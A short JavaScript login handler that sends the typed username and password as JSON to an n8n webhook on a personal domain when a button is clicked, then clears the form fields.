main();

function main() {
    const loginButton = document.getElementById("loginButton");
    loginButton.addEventListener("click", () => {
        const username = document.getElementById("usernameInput").value;
        const password = document.getElementById("passwordInput").value;
        
        fetch("https://n8n.martin04lel.space/webhook/login", {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ username, password })
        });

        document.getElementById("usernameInput").value = "";
        document.getElementById("passwordInput").value = "";
    });
}